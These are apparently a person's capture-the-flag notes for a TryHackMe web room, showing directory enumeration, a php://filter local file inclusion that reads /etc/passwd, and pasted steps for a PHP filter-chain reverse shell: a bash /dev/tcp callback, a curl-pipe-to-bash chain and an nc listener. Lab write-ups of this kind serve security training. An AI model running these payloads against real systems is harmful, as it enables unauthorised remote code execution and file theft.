<code>
https://tryhackme.com/r/room/cheesectfv10

┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.251.14 -x php,txt,html                                                                                                      
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.251.14
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/images               (Status: 301) [Size: 313] [--> http://10.10.251.14/images/]
/index.html           (Status: 200) [Size: 1759]
/.php                 (Status: 403) [Size: 277]
/login.php            (Status: 200) [Size: 834]
/users.html           (Status: 200) [Size: 377]
/messages.html        (Status: 200) [Size: 448]
/orders.html          (Status: 200) [Size: 380]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
                                                                   

http://10.10.251.14/secret-script.php?file=php://filter/resource=supersecretmessageforadmin

### LFI

┌──(kali㉿kali)-[~]
└─$ ffuf -u http://10.10.251.14/secret-script.php?file=php://filter/resource=FUZZ -c -w ../kali/Documents/www/wordlists/LFI-WordList-Linux.txt -fs 0 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.251.14/secret-script.php?file=php://filter/resource=FUZZ
 :: Wordlist         : FUZZ: /home/kali/Documents/www/wordlists/LFI-WordList-Linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

/etc/apache2/mods-available/deflate.conf [Status: 200, Size: 395, Words: 23, Lines: 11, Duration: 49ms]
/etc/apache2/mods-available/mime.conf [Status: 200, Size: 7676, Words: 943, Lines: 252, Duration: 49ms]
/etc/apache2/mods-available/autoindex.conf [Status: 200, Size: 3374, Words: 313, Lines: 97, Duration: 49ms]
/etc/bash.bashrc        [Status: 200, Size: 2319, Words: 399, Lines: 72, Duration: 46ms]
/etc/ca-certificates.conf.dpkg-old [Status: 200, Size: 6824, Words: 64, Lines: 168, Duration: 46ms]
/etc/ca-certificates.conf [Status: 200, Size: 7545, Words: 64, Lines: 187, Duration: 46ms]
/etc/crontab            [Status: 200, Size: 1042, Words: 181, Lines: 23, Duration: 45ms]
/etc/crypttab           [Status: 200, Size: 54, Words: 5, Lines: 2, Duration: 45ms]
/etc/debian_version     [Status: 200, Size: 13, Words: 1, Lines: 2, Duration: 45ms]
/etc/debconf.conf       [Status: 200, Size: 2969, Words: 411, Lines: 84, Duration: 46ms]
/etc/default/grub       [Status: 200, Size: 1216, Words: 142, Lines: 34, Duration: 46ms]
/etc/deluser.conf       [Status: 200, Size: 604, Words: 86, Lines: 21, Duration: 46ms]
/etc/dhcp/dhclient.conf [Status: 200, Size: 1735, Words: 168, Lines: 55, Duration: 45ms]
/etc/apache2/mods-available/dir.conf [Status: 200, Size: 157, Words: 15, Lines: 6, Duration: 586ms]
/etc/fstab              [Status: 200, Size: 658, Words: 77, Lines: 13, Duration: 352ms]
/etc/host.conf          [Status: 200, Size: 92, Words: 16, Lines: 4, Duration: 629ms]
/etc/group-             [Status: 200, Size: 822, Words: 1, Lines: 61, Duration: 630ms]
/etc/group              [Status: 200, Size: 817, Words: 1, Lines: 61, Duration: 630ms]
/etc/hosts.allow        [Status: 200, Size: 411, Words: 82, Lines: 11, Duration: 629ms]


  
http://10.10.251.14/secret-script.php?file=php://filter/resource=../../../../etc/hosts

http://10.10.251.14/secret-script.php?file=php://filter/resource=../../../../etc/passwd

comte:x:1000:1000:comte:/home/comte:/bin/bash

### reverse shell
https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/
https://github.com/synacktiv/php_filter_chain_generator


python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
Copied!
We only have to do is paste the above generated payload to /?page=<genrated_chain>.

Reverse Shell
First create a shell script named "revshell" in local machine.

bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
Copied!
Then create a chain using a generator.
Replace the ip address with your own.

# `<?= ?>` is a shorthand for `<?php echo ~ ?>`
python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.0.0.1/revshell|bash` ?>'
Copied!
We need to start a web server that hosts the shell script, and also start a listener for receiving the reverse connection.

# terminal 1
sudo python3 -m http.server 80

# terminal 2
nc -lvnp 4444
Copied!
Now access to /?page=<generated_chain>. We can get a shell.



</code>
